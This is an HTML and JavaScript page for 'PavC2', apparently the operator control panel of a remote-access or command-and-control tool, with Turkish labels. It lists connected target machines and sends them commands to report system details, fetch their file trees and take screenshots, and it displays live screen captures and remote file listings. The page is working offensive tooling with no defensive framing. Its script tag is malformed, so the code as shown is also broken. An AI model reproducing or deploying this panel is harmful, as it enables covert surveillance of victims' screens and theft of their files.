<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>PavC2 - Cyber Command Center</title>
    <style>
        :root {
            --bg: #06070d;
            --panel: #0e111a;
            --border: #1e293b;
            --neon: #00f2fe;
            --neon-pink: #fe019a;
            --text: #f8fafc;
            --online: #10b981;
            --offline: #ef4444;
        }
        body { background: var(--bg); color: var(--text); font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
        h1 { color: var(--neon); text-shadow: 0 0 10px rgba(0, 242, 254, 0.5); margin-top: 0; }
        .grid { display: grid; grid-template-columns: 1.2fr 2fr; gap: 20px; }
        .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        .panel-title { border-bottom: 1px solid var(--border); padding-bottom: 10px; margin-top: 0; color: var(--neon-pink); font-size: 16px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid var(--border); font-size: 13px; }
        th { color: var(--neon); }
        tr:hover { background: #161e2e; cursor: pointer; }
        .status { font-weight: bold; padding: 2px 6px; border-radius: 4px; font-size: 11px; }
        .status.online { background: rgba(16, 185, 129, 0.2); color: var(--online); }
        .status.offline { background: rgba(239, 68, 68, 0.2); color: var(--offline); }
        .tabs { display: flex; gap: 10px; margin-bottom: 15px; }
        .tab-btn { background: #1e293b; border: none; color: white; padding: 8px 16px; cursor: pointer; border-radius: 4px; font-family: inherit; }
        .tab-btn.active { background: var(--neon); color: black; font-weight: bold; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        input, select, button { background: #000; border: 1px solid var(--border); color: #fff; padding: 10px; margin: 5px 0; width: 100%; box-sizing: border-box; border-radius: 4px; font-family: inherit; }
        input:focus, select:focus { border-color: var(--neon); outline: none; }
        button { background: var(--neon-pink); color: white; font-weight: bold; cursor: pointer; border: none; }
        button:hover { opacity: 0.9; box-shadow: 0 0 10px var(--neon-pink); }
        .screen-view { width: 100%; height: 300px; background: #000; border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; overflow: hidden; border-radius: 4px; }
        .screen-view img { max-width: 100%; max-height: 100%; object-fit: contain; }
        .file-list { background: #020617; border: 1px solid var(--border); height: 200px; overflow-y: auto; padding: 10px; border-radius: 4px; }
        .file-item { padding: 6px; border-bottom: 1px solid #1e293b; font-size: 12px; display: flex; justify-content: space-between; }
        .file-item:hover { background: #0f172a; }
    </style>
</head>
<body>

<h1>// PAV-C2 ADVANCED CYBER STATION</h1>

<div class="grid">
    <div class="panel">
        <h3 class="panel-title">> BAĞLI CİHAZLAR VE AKTİFLİK DURUMU</h3>
        <table>
            <thead>
                <tr><th>HEDEF ID</th><th>IP ADRESİ</th><th>DURUM</th></tr>
            </thead>
            <tbody id="client-table">
                </tbody>
        </table>
    </div>

    <div class="panel">
        <h3 class="panel-title">> OPERASYON MERKEZİ</h3>
        <label style="font-size:12px; color:#64748b;">Seçili Ajan:</label>
        <input type="text" id="target-id" readonly placeholder="Listeden bir cihaz seçin..." style="color:var(--neon); font-weight:bold;">

        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('terminal-tab', this)">Temel Komutlar</button>
            <button class="tab-btn" onclick="switchTab('screen-tab', this)">Ekran İzleme</button>
            <button class="tab-btn" onclick="switchTab('files-tab', this)">Dosya Gezgini</button>
        </div>

        <div id="terminal-tab" class="tab-content active">
            <label>İşlem Kodu:</label>
            <select id="command-id">
                <option value="1">CMD_PING (Canlılık Testi)</option>
                <option value="2">CMD_SYSINFO (Sistem Detayları)</option>
                <option value="5">FETCH_FILES (Dosya Ağacını Çek)</option>
                <option value="6">TAKE_SCREENSHOT (Anlık Ekran İste)</option>
            </select>
            <label>Ek Veri (Opsiyonel):</label>
            <input type="text" id="extra-data" placeholder="Parametre dizini...">
            <button onclick="sendCommand()">KOMUTU İLET</button>
        </div>

        <div id="screen-tab" class="tab-content">
            <button onclick="triggerAction(6)" style="background:var(--neon); color:black; margin-bottom:10px;">EKRANI GÜNCELLE</button>
            <div class="screen-view">
                <img id="live-screen" src="" alt="[ Ekran Verisi Bekleniyor ]" onerror="this.style.display='none'">
                <span id="screen-placeholder" style="color:#475569;">Görüntü Akışı Yok</span>
            </div>
        </div>

        <div id="files-tab" class="tab-content">
            <button onclick="triggerAction(5)" style="background:var(--neon); color:black; margin-bottom:10px;">DOSYA SİSTEMİNİ TARA</button>
            <div class="file-list" id="file-container">
                <div style="color:#475569; text-align:center; padding-top:80px;">Dosya kaydı bulunamadı.</div>
            </div>
        </div>
    </div>
</div>

<script {
    let selectedId = "";

    function switchTab(tabId, btn) {
        document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
        document.getElementById(tabId).classList.add('active');
        btn.classList.add('active');
    }

    async function fetchClients() {
        try {
            const res = await fetch('http://localhost:3000/api/clients');
            const data = await res.json();
            const tbody = document.getElementById('client-table');
            tbody.innerHTML = '';

            data.forEach(c => {
                const isOnline = c.status === "Çevrimiçi";
                const badgeClass = isOnline ? "online" : "offline";
                
                const tr = document.createElement('tr');
                tr.onclick = () => {
                    selectedId = c.id;
                    document.getElementById('target-id').value = c.id;
                    
                    const img = document.getElementById('live-screen');
                    const placeholder = document.getElementById('screen-placeholder');
                    if(c.currentScreen) {
                        img.src = "data:image/png;base64," + c.currentScreen;
                        img.style.display = 'block';
                        placeholder.style.display = 'none';
                    } else {
                        img.style.display = 'none';
                        placeholder.style.display = 'block';
                    }

                    const fContainer = document.getElementById('file-container');
                    fContainer.innerHTML = '';
                    if(c.files && c.files.length > 0) {
                        c.files.forEach(f => {
                            fContainer.innerHTML += `<div class="file-item"><span>📄 ${f.name}</span><span style="color:#64748b">${f.size || 'N/A'}</span></div>`;
                        });
                    } else {
                        fContainer.innerHTML = `<div style="color:#475569; text-align:center; padding-top:80px;">Veri yok. Tara butonuna basın.</div>`;
                    }
                };

                tr.innerHTML = `<td>${c.id}</td><td>${c.ip}</td><td><span class="status ${badgeClass}">${c.status}</span></td>`;
                tbody.appendChild(tr);
            });
        } catch (e) {}
    }

    async function sendCommand() {
        if(!selectedId) return alert("Hedef seçmediniz!");
        const commandId = document.getElementById('command-id').value;
        const extraData = document.getElementById('extra-data').value;
        executePost(commandId, extraData);
    }

    async function triggerAction(cmdId) {
        if(!selectedId) return alert("Hedef seçmediniz!");
        executePost(cmdId, "");
    }

    async function executePost(cmdId, extra) {
        try {
            const res = await fetch('http://localhost:3000/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ clientId: selectedId, commandId: cmdId, extraData: extra })
            });
            const r = await res.json();
            if(r.error) alert(r.error);
        } catch(e) {}
    }

    setInterval(fetchClients, 2000);
</script>
</body>
</html>
